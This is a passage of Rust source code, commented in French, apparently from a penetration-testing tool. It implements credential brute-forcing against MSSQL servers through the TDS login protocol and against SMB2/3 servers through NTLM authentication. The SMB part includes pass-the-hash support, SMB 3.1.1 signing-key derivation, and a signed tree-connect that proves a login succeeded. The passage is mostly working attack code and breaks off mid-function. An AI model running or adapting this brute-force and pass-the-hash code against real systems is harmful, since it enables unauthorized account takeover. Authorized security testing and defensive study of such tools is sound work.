    let zero: (u16, u16) = (TDS_FIXED, 0);
    for (o, l) in [
        (host_off, host_len),
        (user_off, user_len),
        (pwd_off, pwd_len),
        (app_off, app_len),
        zero,
        zero,
        zero,
        zero,
        zero, // Server, Ext, CltInt, Lang, DB
    ] {
        p.extend_from_slice(&o.to_le_bytes());
        p.extend_from_slice(&l.to_le_bytes());
    }
    p.extend_from_slice(&[0u8; 6]); // ClientID
    for _ in 0..3 {
        // SSPI, AtchDBFile, ChangePassword
        p.extend_from_slice(&zero.0.to_le_bytes());
        p.extend_from_slice(&zero.1.to_le_bytes());
    }
    p.extend_from_slice(&0u32.to_le_bytes()); // cbSSPILong

    p.extend_from_slice(&data);
    let total = p.len() as u32;
    p[0..4].copy_from_slice(&total.to_le_bytes());
    p
}

fn tds_prelogin() -> Vec<u8> {
    let mut payload = Vec::new();
    payload.push(0x00);
    payload.extend_from_slice(&11u16.to_be_bytes());
    payload.extend_from_slice(&6u16.to_be_bytes());
    payload.push(0x01);
    payload.extend_from_slice(&17u16.to_be_bytes());
    payload.extend_from_slice(&1u16.to_be_bytes());
    payload.push(0xFF); // TERMINATOR
    payload.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); // VERSION (6)
    payload.push(0x00); // ENCRYPTION = OFF
    tds_packet(0x12, &payload)
}

/// Valeur ENCRYPTION de la réponse PRELOGIN (0x01 = ENCRYPT_ON → TLS requis).
fn tds_prelogin_encryption(payload: &[u8]) -> Option<u8> {
    let mut i = 0;
    while i + 5 <= payload.len() {
        let token = payload[i];
        if token == 0xFF {
            return None;
        }
        let off = u16::from_be_bytes([payload[i + 1], payload[i + 2]]) as usize;
        let len = u16::from_be_bytes([payload[i + 3], payload[i + 4]]) as usize;
        if token == 0x01 && len >= 1 {
            return payload.get(off).copied();
        }
        i += 5;
    }
    None
}

async fn tds_read_message(stream: &mut TcpStream, timeout: Duration) -> Result<Vec<u8>, ()> {
    let mut payload = Vec::new();
    loop {
        let hdr = read_n(stream, 8, timeout).await?;
        let len = u16::from_be_bytes([hdr[2], hdr[3]]) as usize;
        if len < 8 {
            return Err(());
        }
        let body = read_n(stream, len - 8, timeout).await?;
        payload.extend_from_slice(&body);
        if hdr[1] & 0x01 != 0 {
            break;
        }
        if payload.len() > 1_000_000 {
            return Err(());
        }
    }
    Ok(payload)
}

/// Texte du premier token ERROR (0xAA) d'un message TDS.
fn tds_error_text(msg: &[u8]) -> String {
    let mut i = 0;
    while i + 3 <= msg.len() {
        if msg[i] == 0xAA {
            let len = u16::from_le_bytes([msg[i + 1], msg[i + 2]]) as usize;
            let end = (i + 3 + len).min(msg.len());
            let body = &msg[i + 3..end];
            if body.len() >= 8 {
                let mlen = u16::from_le_bytes([body[6], body[7]]) as usize;
                let mend = (8 + mlen).min(body.len());
                let u16s: Vec<u16> = body[8..mend]
                    .chunks_exact(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect();
                return String::from_utf16_lossy(&u16s);
            }
        }
        i += 1;
    }
    String::new()
}

pub async fn brute_mssql(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "mssql",
        &target,
        |user, pass| async move { try_mssql_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result(
                "mssql",
                host,
                port,
                u,
                p,
                proof,
                start.elapsed().as_millis(),
            )
        })
        .collect();

    BruteReport {
        target,
        service: "mssql".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_mssql_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    // PRELOGIN
    if write_all_to(&mut stream, &tds_prelogin(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Ok(pre) = tds_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };
    if let Some(enc) = tds_prelogin_encryption(&pre) {
        // ENCRYPT_ON / ENCRYPT_REQ : le serveur impose TLS, hors périmètre.
        if enc >= 0x01 {
            return AttemptOutcome::Failure;
        }
    }

    // LOGIN7
    let login = tds_packet(0x10, &tds_login7(user, pass));
    if write_all_to(&mut stream, &login, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    let Ok(msg) = tds_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };

    // ERROR (0xAA) vérifié en premier : un mot de passe refusé produit toujours
    // un ERROR, jamais un LOGINACK.
    if msg.contains(&0xAA) {
        let txt = tds_error_text(&msg);
        if let Some(m) = detect_lockout(&txt) {
            return AttemptOutcome::Locked(format!("MSSQL {} — {}", txt.trim(), m));
        }
        return AttemptOutcome::Failure;
    }
    if msg.contains(&0xAD) {
        return AttemptOutcome::Success(format!(
            "MSSQL LOGIN7 accepté (LOGINACK) : {}:{}",
            user, pass
        ));
    }
    AttemptOutcome::Failure
}

// ─────────────────────────────────────────────────────────────────────────────
// SMB2 / SMB3 — authentification NTLM (NTLMSSP encapsulé SPNEGO)
//
// Flux : NEGOTIATE (dialectes 2.0.2 → **3.1.1**) puis SESSION_SETUP en deux
// temps (Type 1 → CHALLENGE Type 2 → Type 3). Le support `NtlmSecret::NtHash`
// offre le **pass-the-hash** : un mot de passe au format hash NT (32
// hexadécimaux) est reconnu et utilisé sans jamais dériver le clair.
//
// SMB 3.1.1 est annoncé avec sa liste de **contextes de négociation**
// (`PREAUTH_INTEGRITY` SHA-512, `ENCRYPTION`, `SIGNING`) — sans laquelle un
// serveur rejette la requête par `STATUS_INVALID_PARAMETER` — et l'« integrity
// hash » de pré-authentification (SHA-512 chaîné sur NEGOTIATE puis les deux
// SESSION_SETUP) est calculé comme l'exige [MS-SMB2] §3.3.5.2.5.
// ─────────────────────────────────────────────────────────────────────────────

const SMB2_NEGOTIATE: u16 = 0x0000;
const SMB2_SESSION_SETUP: u16 = 0x0001;
const SMB2_TREE_CONNECT: u16 = 0x0003;

/// `Flags` de l'en-tête SMB2 : marque le message comme signé (bit 3).
const SMB2_FLAGS_SIGNED: u32 = 0x0000_0008;

/// `SecurityMode` d'une réponse NEGOTIATE : le serveur accepte la signature
/// (`ENABLED`) — condition pour qu'un message signé soit vérifié et non rejeté.
const SMB2_NEGOTIATE_SIGNING_ENABLED: u16 = 0x0001;

/// Dialogue 3.1.1, du plus récent au plus ancien (préférence décroissante).
const SMB2_DIALECT_311: u16 = 0x0311;
const SMB2_DIALECTS: [u16; 5] = [0x0311, 0x0302, 0x0300, 0x0210, 0x0202];

/// Types de contexte de négociation (SMB 3.1.1, [MS-SMB2] §2.2.3.1).
const SMB2_NEGO_CTX_PREAUTH_INTEGRITY: u16 = 0x0001;
const SMB2_NEGO_CTX_ENCRYPTION: u16 = 0x0002;
const SMB2_NEGO_CTX_SIGNING: u16 = 0x0008;

/// Algorithme de l'integrity hash de pré-authentification (contexte 0x0001).
const SMB2_PREAUTH_SHA512: u16 = 0x0001;
/// Chiffrements proposés (contexte 0x0002).
const SMB2_CIPHER_AES128_CCM: u16 = 0x0001;
const SMB2_CIPHER_AES128_GCM: u16 = 0x0002;
/// Signature (contexte 0x0008) : AES-CMAC est le seul algorithme défini.
const SMB2_SIGN_AES_CMAC: u16 = 0x0000;

/// Taille du sel client du contexte `PREAUTH_INTEGRITY` (32 octets, comme Windows).
const SMB2_PREAUTH_SALT_LEN: usize = 32;

const SMB2_STATUS_SUCCESS: u32 = 0x0000_0000;
const SMB2_STATUS_MORE_PROCESSING_REQUIRED: u32 = 0xC000_0016;
const SMB2_STATUS_WRONG_PASSWORD: u32 = 0xC000_006A;
const SMB2_STATUS_LOGON_FAILURE: u32 = 0xC000_006D;
const SMB2_STATUS_ACCOUNT_DISABLED: u32 = 0xC000_0072;
const SMB2_STATUS_ACCOUNT_EXPIRED: u32 = 0xC000_019F;
const SMB2_STATUS_PASSWORD_EXPIRED: u32 = 0xC000_0071;
const SMB2_STATUS_PASSWORD_MUST_CHANGE: u32 = 0xC000_0224;
const SMB2_STATUS_ACCOUNT_LOCKED_OUT: u32 = 0xC000_0234;
/// Part de `TREE_CONNECT` : un chemin inexistant (mais une signature valide).
const SMB2_STATUS_BAD_NETWORK_NAME: u32 = 0xC000_00CC;
/// Renvoyé par le serveur quand la signature d'un message est invalide.
const SMB2_STATUS_ACCESS_DENIED: u32 = 0xC000_0022;

/// Plafond de lecture d'un message SMB2 (protection contre un `Length` forgé).
const SMB2_MAX_MSG: usize = 8 * 1024 * 1024;

/// En-tête SMB2 (64 octets). Les messages émis par le client ne sont jamais
/// signés : la signature reste nulle (aucune clé de session n'est dérivée).
fn smb2_header(command: u16, message_id: u64, session_id: u64) -> Vec<u8> {
    let mut h = Vec::with_capacity(64);
    h.extend_from_slice(&[0xFE, 0x53, 0x4D, 0x42]); // 0xFE 'S' 'M' 'B'
    h.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
    h.extend_from_slice(&1u16.to_le_bytes()); // CreditCharge
    h.extend_from_slice(&0u32.to_le_bytes()); // Status (requête = 0)
    h.extend_from_slice(&command.to_le_bytes()); // Command
    h.extend_from_slice(&1u16.to_le_bytes()); // CreditRequest
    h.extend_from_slice(&0u32.to_le_bytes()); // Flags
    h.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
    h.extend_from_slice(&message_id.to_le_bytes()); // MessageId
    h.extend_from_slice(&0xFEFFu32.to_le_bytes()); // ProcessId
    h.extend_from_slice(&0u32.to_le_bytes()); // TreeId
    h.extend_from_slice(&session_id.to_le_bytes()); // SessionId
    h.extend_from_slice(&[0u8; 16]); // Signature
    h
}

fn smb2_status(msg: &[u8]) -> u32 {
    if msg.len() < 12 {
        return 0xFFFF_FFFF;
    }
    u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]])
}

fn smb2_session_id(msg: &[u8]) -> u64 {
    if msg.len() < 48 {
        return 0;
    }
    u64::from_le_bytes([
        msg[40], msg[41], msg[42], msg[43], msg[44], msg[45], msg[46], msg[47],
    ])
}

/// Contexte de négociation SMB 3.1.1 : en-tête de 8 octets (`ContextType`,
/// `DataLength`, `Reserved`) suivi des données **bourrées à zéro jusqu'à un
/// multiple de 8**, `DataLength` incluant ce bourrage.
fn smb2_nego_context(ctx_type: u16, data: &[u8]) -> Vec<u8> {
    let padded = (data.len() + 7) & !7;
    let mut out = Vec::with_capacity(8 + padded);
    out.extend_from_slice(&ctx_type.to_le_bytes());
    out.extend_from_slice(&(padded as u16).to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes()); // Reserved
    out.extend_from_slice(data);
    out.resize(8 + padded, 0); // bourrage
    out
}

/// Liste des contextes de négociation annoncés par le client pour SMB 3.1.1 :
/// `PREAUTH_INTEGRITY` (SHA-512 + sel client), `ENCRYPTION`, `SIGNING`.
fn smb2_nego_context_list(preauth_salt: &[u8]) -> Vec<u8> {
    // PREAUTH_INTEGRITY : {HashAlgorithmCount, SaltLength, HashAlgorithms, Salt}
    let mut preauth = Vec::new();
    preauth.extend_from_slice(&1u16.to_le_bytes()); // HashAlgorithmCount
    preauth.extend_from_slice(&(preauth_salt.len() as u16).to_le_bytes());
    preauth.extend_from_slice(&SMB2_PREAUTH_SHA512.to_le_bytes());
    preauth.extend_from_slice(preauth_salt);

    // ENCRYPTION : AES-128-GCM préféré, AES-128-CCM en repli.
    let mut enc = Vec::new();
    enc.extend_from_slice(&2u16.to_le_bytes()); // CipherCount
    enc.extend_from_slice(&SMB2_CIPHER_AES128_GCM.to_le_bytes());
    enc.extend_from_slice(&SMB2_CIPHER_AES128_CCM.to_le_bytes());

    // SIGNING : AES-CMAC.
    let mut sign = Vec::new();
    sign.extend_from_slice(&1u16.to_le_bytes()); // SigningAlgorithmCount
    sign.extend_from_slice(&SMB2_SIGN_AES_CMAC.to_le_bytes());

    let mut out = Vec::new();
    out.extend_from_slice(&smb2_nego_context(
        SMB2_NEGO_CTX_PREAUTH_INTEGRITY,
        &preauth,
    ));
    out.extend_from_slice(&smb2_nego_context(SMB2_NEGO_CTX_ENCRYPTION, &enc));
    out.extend_from_slice(&smb2_nego_context(SMB2_NEGO_CTX_SIGNING, &sign));
    out
}

/// Corps d'une requête `NEGOTIATE` (StructureSize 36). Le dialecte 3.1.1 est
/// proposé en tête : les 8 octets qui suivaient le `ClientGuid` portent alors
/// `NegotiateContextOffset`/`Count`/`Reserved2`, et la liste de contextes est
/// ajoutée après les dialectes, alignée sur 8 octets.
fn smb2_negotiate_request(preauth_salt: &[u8]) -> Vec<u8> {
    let contexts = smb2_nego_context_list(preauth_salt);
    let dialects_end = 36 + SMB2_DIALECTS.len() * 2;
    let ctx_off = (dialects_end + 7) & !7; // offset depuis l'en-tête SMB2

    let mut b = Vec::with_capacity(ctx_off + contexts.len());
    b.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
    b.extend_from_slice(&(SMB2_DIALECTS.len() as u16).to_le_bytes()); // DialectCount
    b.extend_from_slice(&0x0001u16.to_le_bytes()); // SecurityMode: signing enabled
    b.extend_from_slice(&0u16.to_le_bytes()); // Reserved
    b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
    b.extend_from_slice(&random_client_guid()); // ClientGuid
    b.extend_from_slice(&((ctx_off + 64) as u32).to_le_bytes()); // NegotiateContextOffset
    b.extend_from_slice(&3u16.to_le_bytes()); // NegotiateContextCount
    b.extend_from_slice(&0u16.to_le_bytes()); // Reserved2
    for d in SMB2_DIALECTS {
        b.extend_from_slice(&d.to_le_bytes());
    }
    b.resize(ctx_off, 0); // bourrage jusqu'au 8-octet
    b.extend_from_slice(&contexts);
    b
}

/// Résultat d'une négociation : dialecte retenu et, pour SMB 3.1.1, les
/// algorithmes choisis par le serveur dans la liste de contextes.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct Smb2Negotiate {
    dialect: u16,
    /// `SecurityMode` du serveur — dit s'il accepte (voire exige) la signature.
    security_mode: u16,
    /// Chiffrement retenu (contexte `ENCRYPTION`).
    cipher: Option<u16>,
    /// Algorithme d'integrity hash retenu (contexte `PREAUTH_INTEGRITY`).
    preauth_hash: Option<u16>,
    /// Sel serveur du contexte `PREAUTH_INTEGRITY`.
    server_salt: Vec<u8>,
}

/// Analyse une réponse `NEGOTIATE`. La zone fixe est identique pour tous les
/// dialectes (StructureSize 65) ; les contextes ne sont présents qu'en 3.1.1.
fn smb2_parse_negotiate(msg: &[u8]) -> Option<Smb2Negotiate> {
    if msg.len() < 72 {
        return None;
    }
    let security_mode = u16::from_le_bytes([msg[66], msg[67]]); // SMB2_NEGOTIATE_SIGNING_*
    let dialect = u16::from_le_bytes([msg[68], msg[69]]);
    let mut info = Smb2Negotiate {
        dialect,
        security_mode,
        ..Default::default()
    };
    if dialect != SMB2_DIALECT_311 || msg.len() < 128 {
        return Some(info);
    }

    let ctx_count = u16::from_le_bytes([msg[70], msg[71]]) as usize;
    let ctx_off = u32::from_le_bytes([msg[124], msg[125], msg[126], msg[127]]) as usize;
    if ctx_count == 0 || ctx_off < 128 || ctx_off > msg.len() {
        return Some(info);
    }

    let mut i = ctx_off;
    for _ in 0..ctx_count {
        if i + 8 > msg.len() {
            break;
        }
        let ctype = u16::from_le_bytes([msg[i], msg[i + 1]]);
        let clen = u16::from_le_bytes([msg[i + 2], msg[i + 3]]) as usize;
        if i + 8 + clen > msg.len() {
            break;
        }
        let data = &msg[i + 8..i + 8 + clen];
        match ctype {
            // {HashAlgorithmCount, SaltLength, HashAlgorithms, Salt}
            SMB2_NEGO_CTX_PREAUTH_INTEGRITY if data.len() >= 6 => {
                info.preauth_hash = Some(u16::from_le_bytes([data[4], data[5]]));
                let salt_len = u16::from_le_bytes([data[2], data[3]]) as usize;
                if 6 + salt_len <= data.len() {
                    info.server_salt = data[6..6 + salt_len].to_vec();
                }
            }
            // {CipherCount, Ciphers…} — le premier est celui retenu.
            SMB2_NEGO_CTX_ENCRYPTION if data.len() >= 4 => {
                info.cipher = Some(u16::from_le_bytes([data[2], data[3]]));
            }
            _ => {}
        }
        // Le contexte suivant commence sur une frontière de 8 octets.
        i += 8 + ((clen + 7) & !7);
    }
    Some(info)
}

/// Libellé lisible d'un chiffrement SMB 3.1.1.
fn smb2_cipher_label(c: u16) -> &'static str {
    match c {
        SMB2_CIPHER_AES128_CCM => "AES-128-CCM",
        SMB2_CIPHER_AES128_GCM => "AES-128-GCM",
        0x0003 => "AES-256-CCM",
        0x0004 => "AES-256-GCM",
        _ => "chiffrement inconnu",
    }
}

/// Integrity hash de pré-authentification ([MS-SMB2] §3.3.5.2.5) : SHA-512
/// chaîné sur les messages du handshake, dans l'ordre NEGOTIATE (requête puis
/// réponse) → SESSION_SETUP #1 → SESSION_SETUP #2. Le flux haché **exclut**
/// l'en-tête de session NetBIOS, d'où l'alimentation avec les messages bruts.
struct PreauthIntegrityHash(sha2::Sha512);

impl PreauthIntegrityHash {
    fn new() -> Self {
        use sha2::Digest;
        Self(<sha2::Sha512 as Digest>::new())
    }

    fn update(&mut self, msg: &[u8]) {
        use sha2::Digest;
        Digest::update(&mut self.0, msg);
    }

    fn finalize(self) -> [u8; 64] {
        use sha2::Digest;
        let out = Digest::finalize(self.0);
        let mut h = [0u8; 64];
        h.copy_from_slice(&out);
        h
    }
}

/// KDF en mode compteur (SP800-108, HMAC-SHA256) de [MS-SMB2] §3.3.5.2.5.1 :
/// `K(i) = HMAC-SHA256(clé, [i]_BE32 ‖ label ‖ 0x00 ‖ contexte ‖ [L]_BE32)`.
/// Les blocs sont concaténés puis tronqués à `out_len`.
// `Hmac::new_from_slice` accepte toute longueur de clé : infaillible.
#[allow(clippy::expect_used)]
fn smb2_kdf_counter(key: &[u8], label: &[u8], context: &[u8], out_len: usize) -> Vec<u8> {
    use hmac::{Hmac, Mac};
    type HmacSha256 = Hmac<sha2::Sha256>;

    let mut out = Vec::with_capacity(out_len + 32);
    let mut i: u32 = 1;
    while out.len() < out_len {
        let mut mac = HmacSha256::new_from_slice(key).expect("HMAC accepte toute taille de clé");
        mac.update(&i.to_be_bytes());
        mac.update(label);
        mac.update(&[0x00]); // séparateur
        mac.update(context);
        mac.update(&((out_len as u32) * 8).to_be_bytes()); // L en bits
        out.extend_from_slice(&mac.finalize().into_bytes());
        i += 1;
    }
    out.truncate(out_len);
    out
}

/// Clé de signature SMB 3.1.1 : `KDF(clé_de_session, "SMBSigningKey",
/// PreauthIntegrityHashValue)` ([MS-SMB2] §3.3.5.2.5.1).
fn smb2_signing_key(session_key: &[u8], preauth_hash: &[u8]) -> [u8; 16] {
    let mut k = [0u8; 16];
    k.copy_from_slice(&smb2_kdf_counter(
        session_key,
        b"SMBSigningKey",
        preauth_hash,
        16,
    ));
    k
}

/// AES-128-CMAC (RFC 4493) — primitive de signature des messages SMB 2/3.
fn aes_cmac_128(key: &[u8; 16], msg: &[u8]) -> [u8; 16] {
    use aes::cipher::generic_array::GenericArray;
    use aes::cipher::{BlockEncrypt, KeyInit};

    let cipher = aes::Aes128::new(GenericArray::from_slice(key));
    let enc = |block: &[u8; 16]| -> [u8; 16] {
        let mut b = GenericArray::clone_from_slice(block);
        cipher.encrypt_block(&mut b);
        let mut out = [0u8; 16];
        out.copy_from_slice(&b);
        out
    };

    // Sous-clés K1/K2 : doublement dans GF(2^128), réduction par 0x87.
    let dbl = |k: &[u8; 16]| -> [u8; 16] {
        let mut out = [0u8; 16];
        let carry = k[0] >> 7;
        for i in 0..16 {
            out[i] = (k[i] << 1) | if i + 1 < 16 { k[i + 1] >> 7 } else { 0 };
        }
        if carry == 1 {
            out[15] ^= 0x87;
        }
        out
    };
    let k1 = dbl(&enc(&[0u8; 16]));
    let k2 = dbl(&k1);

    let n = if msg.is_empty() {
        1
    } else {
        (msg.len() + 15) / 16
    };
    let complete = !msg.is_empty() && msg.len() % 16 == 0;

    // Dernier bloc : XOR K1 s'il est complet, sinon complété par `10*` puis K2.
    let tail = msg.get((n - 1) * 16..).unwrap_or(&[]);
    let mut last = [0u8; 16];
    last[..tail.len()].copy_from_slice(tail);
    if !complete {
        last[tail.len()] = 0x80;
    }
    let pad = if complete { k1 } else { k2 };
    for i in 0..16 {
        last[i] ^= pad[i];
    }

    let mut x = [0u8; 16];
    for i in 0..n - 1 {
        let mut blk = [0u8; 16];
        blk.copy_from_slice(&msg[i * 16..i * 16 + 16]);
        for j in 0..16 {
            blk[j] ^= x[j];
        }
        x = enc(&blk);
    }
    for j in 0..16 {
        last[j] ^= x[j];
    }
    enc(&last)
}

/// Signe un message SMB2 en place ([MS-SMB2] §3.1.4.1) : le bit `SIGNED` est
/// posé dans `Flags`, le champ `Signature` remis à zéro, puis l'AES-CMAC de la
/// **totalité** du message (signature nulle) est écrit à l'emplacement dédié
/// (offset 48, 16 octets). En SMB 3.1.1 la clé vient de
/// `smb2_signing_key(SessionKey, PreauthIntegrityHash)`.
fn smb2_sign(msg: &mut [u8], key: &[u8; 16]) {
    if msg.len() < 64 {
        return;
    }
    let flags = u32::from_le_bytes([msg[16], msg[17], msg[18], msg[19]]) | SMB2_FLAGS_SIGNED;
    msg[16..20].copy_from_slice(&flags.to_le_bytes());
    msg[48..64].fill(0);
    let sig = aes_cmac_128(key, msg);
    msg[48..64].copy_from_slice(&sig);
}

/// Corps `TREE_CONNECT` (StructureSize 9) : chemin UNC en UTF-16LE
/// (`PathOffset` = 64 en-tête + 8 octets de corps fixe).
fn smb2_tree_connect_body(unc_path: &str) -> Vec<u8> {
    let mut path = Vec::with_capacity(unc_path.len() * 2);
    for u in unc_path.encode_utf16() {
        path.extend_from_slice(&u.to_le_bytes());
    }

    let mut b = Vec::with_capacity(8 + path.len());
    b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
    b.extend_from_slice(&0u16.to_le_bytes()); // Flags (réservé aux clients)
    b.extend_from_slice(&(64u16 + 8u16).to_le_bytes()); // PathOffset
    b.extend_from_slice(&(path.len() as u16).to_le_bytes()); // PathLength
    b.extend_from_slice(&path);
    b
}

/// Épreuve de la clé de signature : un `TREE_CONNECT` vers `IPC$` est signé en
/// AES-CMAC puis envoyé sur la session authentifiée. Le serveur recalcule la
/// signature avec **sa** copie de la clé : un `STATUS_SUCCESS` (part montée) ou
/// un `STATUS_BAD_NETWORK_NAME` (part inexistante) prouvent que la signature a
/// été validée, tandis qu'une signature fausse vaut `STATUS_ACCESS_DENIED`.
async fn smb2_signed_tree_connect(
    stream: &mut TcpStream,
    host: &str,
    session_id: u64,
    signing_key: &[u8; 16],
    timeout: Duration,
) -> String {
    let unc = format!("\\\\{}\\IPC$", host);
    let mut req = smb2_header(SMB2_TREE_CONNECT, 3, session_id);
    req.extend_from_slice(&smb2_tree_connect_body(&unc));
    smb2_sign(&mut req, signing_key);

    if smb2_write(stream, &req, timeout).await.is_err() {
        return "TREE_CONNECT signé : session fermée par le serveur".into();
    }
    match smb2_read_message(stream, timeout).await {
        Ok(resp) => match smb2_status(&resp) {
            SMB2_STATUS_SUCCESS => "TREE_CONNECT signé accepté (IPC$)".into(),
            SMB2_STATUS_BAD_NETWORK_NAME => "TREE_CONNECT signé vérifié (part absente)".into(),
            SMB2_STATUS_ACCESS_DENIED => "TREE_CONNECT signé refusé — signature invalide".into(),
            s => format!("TREE_CONNECT signé : statut 0x{:08X}", s),
        },
        Err(_) => "TREE_CONNECT signé : aucune réponse (session coupée)".into(),
    }
}

/// Corps `SESSION_SETUP` (StructureSize 25) portant le jeton de sécurité
/// (`SecurityBufferOffset` = 64 en-tête + 24 corps fixe).
fn smb2_session_setup_body(security_blob: &[u8]) -> Vec<u8> {
    let mut b = Vec::with_capacity(24 + security_blob.len());
    b.extend_from_slice(&25u16.to_le_bytes()); // StructureSize
    b.push(0u8); // Flags
    b.push(0x01u8); // SecurityMode: signing enabled
    b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
    b.extend_from_slice(&0u32.to_le_bytes()); // Channel
    b.extend_from_slice(&(64u16 + 24u16).to_le_bytes()); // SecurityBufferOffset
    b.extend_from_slice(&(security_blob.len() as u16).to_le_bytes());
    b.extend_from_slice(&0u64.to_le_bytes()); // PreviousSessionId
    b.extend_from_slice(security_blob);
    b
}

/// Blob de sécurité d'une réponse `SESSION_SETUP` (offsets 68/70 du message).
fn smb2_session_setup_blob(msg: &[u8]) -> Vec<u8> {
    if msg.len() < 72 {
        return Vec::new();
    }
    let off = u16::from_le_bytes([msg[68], msg[69]]) as usize;
    let len = u16::from_le_bytes([msg[70], msg[71]]) as usize;
    if len == 0 || off + len > msg.len() {
        return Vec::new();
    }
    msg[off..off + len].to_vec()
}

fn random_client_guid() -> [u8; 16] {
    use rand::RngCore;
    let mut g = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut g);
    g
}

/// Sel client du contexte `PREAUTH_INTEGRITY` (aléatoire par connexion, comme
/// Windows) : il entre dans la dérivation des clés de signature en SMB 3.1.1.
fn random_preauth_salt() -> Vec<u8> {
    use rand::RngCore;
    let mut s = vec![0u8; SMB2_PREAUTH_SALT_LEN];
    rand::thread_rng().fill_bytes(&mut s);
    s
}

/// Encadre un message SMB2 dans l'en-tête de session NetBIOS (type 0x00,
/// longueur sur 24 bits big-endian).
async fn smb2_write(stream: &mut TcpStream, msg: &[u8], timeout: Duration) -> Result<(), ()> {
    if msg.len() > 0xFF_FFFF {
        return Err(());
    }
    let mut framed = Vec::with_capacity(msg.len() + 4);
    framed.push(0x00);
    framed.push(((msg.len() >> 16) & 0xFF) as u8);
    framed.push(((msg.len() >> 8) & 0xFF) as u8);
    framed.push((msg.len() & 0xFF) as u8);
    framed.extend_from_slice(msg);
    write_all_to(stream, &framed, timeout).await
}

async fn smb2_read_message(stream: &mut TcpStream, timeout: Duration) -> Result<Vec<u8>, ()> {
    let hdr = read_n(stream, 4, timeout).await?;
    if hdr[0] != 0x00 {
        return Err(());
    }
    let len = ((hdr[1] as usize) << 16) | ((hdr[2] as usize) << 8) | (hdr[3] as usize);
    if len < 64 || len > SMB2_MAX_MSG {
        return Err(());
    }
    read_n(stream, len, timeout).await
}

fn dialect_label(d: u16) -> &'static str {
    match d {
        0x0202 => " (2.0.2)",
        0x0210 => " (2.1)",
        0x0300 => " (3.0)",
        0x0302 => " (3.0.2)",
        0x0311 => " (3.1.1)",
        _ => "",
    }
}

/// Découpe `DOMAINE\compte` ou `compte@domaine` ; sinon domaine vide.
fn split_domain_account(user: &str) -> (String, String) {
    if let Some((d, u)) = user.split_once('\\') {
        return (d.to_string(), u.to_string());
    }
    if let Some((u, d)) = user.split_once('@') {
        return (d.to_string(), u.to_string());
    }
    (String::new(), user.to_string())
}

fn decode_utf16_lossy(b: &[u8]) -> String {
    let units: Vec<u16> = b
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&units)
}

/// `MsvAvNbDomainName` (AvId 2) des `AvPairs` du CHALLENGE — nom NetBIOS du
/// domaine, indispensable au calcul du hash NTLMv2 pour un compte de domaine.
fn avpair_domain(target_info: &[u8]) -> Option<String> {
    let mut i = 0usize;
    while i + 4 <= target_info.len() {
        let id = u16::from_le_bytes([target_info[i], target_info[i + 1]]);
        let len = u16::from_le_bytes([target_info[i + 2], target_info[i + 3]]) as usize;
        i += 4;
        if id == 0 {
            break;
        } // AV_EOL
        if i + len > target_info.len() {
            break;
        }
        if id == 2 {
            return Some(decode_utf16_lossy(&target_info[i..i + len]));
        }
        i += len;
    }
    None
}

/// Reconnaît un hash NT hexadécimal (32 caractères) pour le pass-the-hash.
fn parse_nt_hash(pass: &str) -> Option<[u8; 16]> {
    let s = pass.trim();
    if s.len() != 32 || !s.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    let mut out = [0u8; 16];
    for i in 0..16 {
        out[i] = u8::from_str_radix(s.get(i * 2..i * 2 + 2)?, 16).ok()?;
    }
    Some(out)
}

/// Traduit un code `NTSTATUS` de `SESSION_SETUP` en sortie de tentative.
fn smb2_status_outcome(status: u32) -> AttemptOutcome {
    match status {
        SMB2_STATUS_LOGON_FAILURE | SMB2_STATUS_WRONG_PASSWORD => AttemptOutcome::Failure,
        SMB2_STATUS_ACCOUNT_LOCKED_OUT => {
            AttemptOutcome::Locked(format!("STATUS_ACCOUNT_LOCKED_OUT (0x{:08X})", status))
        }
        SMB2_STATUS_ACCOUNT_DISABLED => {
            AttemptOutcome::Locked(format!("STATUS_ACCOUNT_DISABLED (0x{:08X})", status))
        }
        SMB2_STATUS_ACCOUNT_EXPIRED
        | SMB2_STATUS_PASSWORD_EXPIRED
        | SMB2_STATUS_PASSWORD_MUST_CHANGE => AttemptOutcome::Failure,
        _ => AttemptOutcome::Failure,
    }
}

pub async fn brute_smb(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "smb",
        &target,
        |user, pass| async move { try_smb_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("smb", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "smb".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_smb_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    use crate::ntlm::{
